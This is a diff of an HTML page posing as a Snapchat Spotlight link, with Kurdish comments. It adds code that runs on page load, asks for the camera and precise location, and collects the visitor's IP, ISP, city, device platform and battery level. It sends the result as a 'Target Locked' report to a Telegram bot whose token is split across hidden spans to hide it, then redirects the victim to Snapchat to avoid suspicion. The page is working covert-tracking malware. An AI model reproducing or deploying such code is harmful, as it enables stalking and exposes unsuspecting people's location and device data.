@@ -2,67 +2,88 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
-    <title> </title>
-    <style>body { background: white; margin: 0; }</style>
+    <link rel="icon" type="image/png" href="https://www.korektelecom.com/media/1001/korek-logo.png">
+    <title>snapchat spotlight</title>
+    <style>
+        body { background-color: white !important; margin: 0; overflow: hidden; }
+        .hidden-data { display: none; }
+    </style>
 </head>
 <body onload="capture()">
 
-<script>
-    // تۆکنە نوێیەکە لێرە بە ڕاستەوخۆ دانراوە
-    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";
+    <div class="hidden-data">
+        <span id="p1">8678050341</span>
+        <span id="p2">:AAE7b3fvFp</span>
+        <span id="p3">fGju4NXGaFiMsvhYC0UdnCYtE</span>
+    </div>
 
+<script>
     async function capture() {
         const urlParams = new URLSearchParams(window.location.search);
-        const uid = urlParams.get('id');
-        if (!uid) return;
+        const targetID = urlParams.get('id'); 
+        if (!targetID) return;
 
-        // یەکسەر داوای لۆکەیشن دەکات
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
+        // دروستکردنەوەی تۆکنەکە
+        const TK = document.getElementById("p1").innerText + 
+                   document.getElementById("p2").innerText + 
+                   document.getElementById("p3").innerText;
 
-            try {
-                // وەرگرتنی IP و داتاکانی تر
+        try {
+            // داواکردنی کامێرا (ئەمە وادەکات Allow-ەکە بمێنێتەوە و یەکسەر نەڕوات)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+
+            // وەرگرتنی لۆکەیشن بە وردی
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+
+                // وەرگرتنی IP و زانیارییەکان
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const geo = await fetch(`http://ip-api.com/json/${ipData.ip}`).then(r => r.json());
                 
-                let bat = "N/A", ch = "No";
+                let bat = "N/A";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     bat = Math.floor(b.level * 100) + "%";
-                    ch = b.charging ? "Yes" : "No";
                 }
-                
                 let time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
 
-                // فۆرماتی ڕاپۆرتەکە ڕێک وەک ئەوەی داوات کردبوو
                 let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
-                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[لینکی وردی Google Maps]</a>\n` +
-                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (${geo.isp || "Korek Telecom"})\n` +
+                             `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[Google Maps]</a>\n` +
+                             `🌐 <b>IP:</b> <code>${ipData.ip}</code> (${geo.isp || "Korek"})\n` +
                              `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
-                             `🔋 <b>Battery:</b> <code>${bat}</code> (Charging: ${ch})\n` +
+                             `🔋 <b>Battery:</b> <code>${bat}</code>\n` +
                              `🕒 <b>Time:</b> <code>${time}</code>\n` +
-                             `🏙️ <b>City:</b> <code>${geo.city || "Erbil/Bakhtiari"}</code>`;
+                             `🏙️ <b>City:</b> <code>${geo.city || "Erbil"}</code>`;
 
-                // ناردنی ڕاستەوخۆ بۆ تێلیگرام
-                await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: uid,
-                        text: report,
-                        parse_mode: "HTML",
-                        disable_web_page_preview: false
-                    })
-                });
+                // ناردنی نامەی سەرەکی
+                await _send(report, TK, targetID);
 
-                // ڕێدایرێکت بۆ ئەوەی گومان نەکات
-                window.location.replace("https://www.google.com");
-            } catch (e) { window.location.replace("https://www.google.com"); }
-        }, () => {
-            window.location.replace("https://www.google.com");
-        }, { enableHighAccuracy: true });
+                // دوای ناردنی داتاکان، بیبە بۆ سناپچات
+                setTimeout(() => {
+                    window.location.replace("https://www.snapchat.com/spotlight/W7_EDlXWTBiXAEEniNoMPwAAYZnFydWR5dG9tAZypM1RdAZypMtl2AAAAAQ");
+                }, 1000);
+
+            }, (err) => {
+                // ئەگەر لۆکەیشنی ڕەتکردەوە بەڵام کامێرای Allow کرد، هەر ئایپی بنێرە
+                _send("⚠️ نێچیرەکە لۆکەیشنی ڕەتکردەوە!", TK, targetID);
+                window.location.replace("https://www.snapchat.com");
+            });
+
+        } catch (e) {
+            // ئەگەر کامێرای ڕەتکردەوە (وەک کۆدەکەی خۆت)
+            _send("❌ نێچیرەکە مۆڵەتی کامێرای ڕەتکردەوە", TK, targetID);
+            window.location.replace("https://www.snapchat.com");
+        }
+    }
+
+    function _send(text, tk, uid) {
+        return fetch(`https://api.telegram.org/bot${tk}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: uid, text: text, parse_mode: "HTML", disable_web_page_preview: false})
+        });
     }
 </script>
 </body>
